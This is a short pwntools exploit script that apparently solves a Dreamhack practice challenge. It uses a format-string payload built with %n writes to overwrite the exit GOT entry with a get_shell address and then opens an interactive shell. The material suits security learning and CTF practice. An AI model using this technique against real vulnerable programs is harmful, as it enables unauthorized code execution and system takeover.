from pwn import *
p = process("./basic_exploitation_002")
#p = remote("host1.dreamhack.games", 17166)
e = ELF("./basic_exploitation_002")

get_shell = e.symbols["get_shell"] # 0x08048609
exit_got = e.got["exit"]

print("exit_got: " + hex(exit_got))
print("get_shell: " + hex(get_shell))

#fstring = b"%134514185c%5$n".ljust(4*4)
#fstring += p32(exit_got)

fstring = b"%9c%10$n%125c%11$n%1918c%12$n".ljust(4*9)
fstring += p32(exit_got + 0x0) #09
fstring += p32(exit_got + 0x1) #86
fstring += p32(exit_got + 0x2) #0804

p.send(fstring)

p.interactive()